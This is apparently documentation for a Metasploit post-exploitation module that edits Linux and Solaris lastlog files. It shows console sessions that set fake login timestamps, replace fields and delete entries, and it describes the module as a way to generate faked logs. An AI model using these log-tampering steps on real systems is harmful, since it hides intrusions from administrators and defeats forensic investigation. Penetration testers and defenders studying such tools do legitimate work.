This module modifies lastlog logfiles. It allows to remove a log entry or to modify entries selected by a search string/regex. Also a custom timestamp can be insered for a selected user.

## Module Options

**FILES**

Define a special file to dump. If not defined the common path for Linux and Solaris is checked for a lastlog file

**NEW_TIME**

Set this time as new timestamp for selected user. Format is relativ flexible because it uses [Time.parse](http://ruby-doc.org/stdlib-2.2.3/libdoc/time/rdoc/Time.html#method-c-parse).

**REPLACE**

Replace string to be insered into log entry instead of the original string. This can be used for generating faked logs.

**STRING**

Search log entries for a special string (Regex) and remove them or replace with another string (if REPLACE is defined)

**USER**

Select a special user. (This might be the most common usecase here)

**USE_UPDATEDB**

Use or created (if not already created) updatedb for finding logfiles

**SESSION**

Which session to use, which can be viewed with `sessions -l`


## Scenario
current entry for user:

```
user              :0.0                        2016-01-19 22:44:09 +0100
```

### changing timestamp of an user:
```
msf post(clear_lastlog) > set FILES /tmp/lastlog
FILES => /tmp/lastlog
msf post(clear_lastlog) > set NEW_TIME Sat 29 Oct 23:25:21 CEST 2016
NEW_TIME => Sat 29 Oct 23:25:21 CEST 2016
msf post(clear_lastlog) > set USER 1000
USER => 1000
msf post(clear_lastlog) > run

[*] Need modify	uid=1000 user=user Line=|:0.0| Host=|| Time=1453239849
[*] 1453239849 -> 2016-10-29 23:25:21 +0200
[*] Post module execution completed
```
New entry:

```
usr              :0.0                        2016-10-29 23:25:21 +0200
```

### Changing the "line" entry of an user
```
msf post(clear_lastlog) > unset NEW_TIME
Unsetting NEW_TIME...
msf post(clear_lastlog) > set StRING :0.0
StRING => :0.0
msf post(clear_lastlog) > set REPLACE localhost
REPLACE => localhost
msf post(clear_lastlog) > run

[*] Regex /(?-mix::0.0)/ matches
[*] Need modify	uid=1000 user=user Line=|:0.0| Host=|| Time=1453239849
[*] :0.0 -> localhost
[*] Post module execution completed
```
New entry:

```
user              localhost                   2016-01-19 22:44:09 +0100
```

### Delete an entry:
```
msf post(clear_lastlog) > set USER 1000
USER => 1000
msf post(clear_lastlog) > run
[*] Need modify	uid=1000 user=user Line=|:0.0| Host=|| Time=1453239849
[*] Post module execution completed
```
New entry:

```
user                                          **Never logged in**
```
